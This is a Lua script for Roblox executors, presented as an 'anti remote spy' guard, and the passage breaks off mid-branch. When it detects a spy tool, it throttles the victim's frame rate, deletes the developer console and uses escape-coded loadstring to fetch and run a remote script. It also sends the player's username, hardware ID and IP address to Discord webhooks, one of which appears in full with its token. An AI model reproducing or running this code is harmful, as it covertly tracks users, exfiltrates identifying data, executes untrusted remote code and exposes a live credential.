getgenv().webhookLogs = true -- if you want to log the ppl that tries to steal your remotes
getgenv().webhook = "https://discord.com/api/webhooks/1034887341472489472/ZYaWa36dwb5uNDpdoL_A-O9LsouDoMkxwdZH4-o4IRam10Mcx9TWbu7d1CmQ8tPeBo6f" -- webhookLogs must be true
getgenv().globalLogs = false -- posts the skid that who tryed to log the remotes in our public server
getgenv().fpsPunishment = 10 -- sets and locks the fps when a skid uses remote spy (lower = much more lag)
--SECURITY--
local res =
    (request or http_request or syn.request or http.request)(
    {
        Url = "https://api.luauth.xyz/hwid",
        Method = "GET"
    }
)

-- Variables
local globalWebhook =
    "https://discord.com/api/webhooks/1034887341472489472/ZYaWa36dwb5uNDpdoL_A-O9LsouDoMkxwdZH4-o4IRam10Mcx9TWbu7d1CmQ8tPeBo6f"
local CoreGui = game:GetService("CoreGui")
local plr = game:GetService("Players").LocalPlayer
local devconsole = CoreGui:WaitForChild("DevConsoleMaster")
_G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
    true

game:GetService("RunService").RenderStepped:Connect(
    function()
        if
            _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx ==
                true
         then
            -- HTTP Spy
            if islclosure(syn.request) then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible HTTP Spy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible HTTP Spy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end
            -- Turtle RemoteSpy
            if CoreGui:FindFirstChild("TurtleSpyGUI") then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end

            -- EngoSpy RemoteSpy
            if CoreGui:FindFirstChild("engospy v1.02") or getgenv().engospy == true or getgenv().engospy == false then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end

            -- Mr.Spy RemoteSpy
            if CoreGui:FindFirstChild("Mr.Spy V2 - Rebug") then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end

            -- FrostHook RemoteSpy
            if getgenv().FrostHookSpy == true or getgenv().FrostHookSpy == false then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end

            -- FrontEnd RemoteSpy
            if CoreGui:FindFirstChild("RemoteSpy") then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end

            -- CheatBlox RemoteSpy
            if getgenv().CheatBloxRunning == true then
